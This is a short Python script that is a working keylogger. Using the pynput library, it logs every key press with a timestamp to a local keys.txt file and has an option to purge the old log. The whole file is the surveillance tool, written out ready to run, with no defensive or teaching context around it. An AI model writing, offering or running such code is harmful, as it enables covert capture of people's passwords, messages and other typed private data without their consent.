from pynput.keyboard import Key, Listener
import logging
import os
#TODO:
#add argparse

#change to  True if you want to delete the old log file and generate a new one 
purge_log= False 

# use a custom log dir
# ex : /home/igosad/Documents/keylogger
pwd_dir = ''

# else use the current dir
if not pwd_dir:
    pwd_dir = os.getcwd()

if purge_log :
	os.remove(pwd_dir + "/keys.txt") 


print(f'logging directory : [{pwd_dir}]')

logging.basicConfig(
    filename=(pwd_dir + "/keys.txt"),
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

logging.info('+ starting new log session +')


def key_press(key):
    logging.info(str(key))


with Listener(on_press=key_press) as listener:
    listener.join()
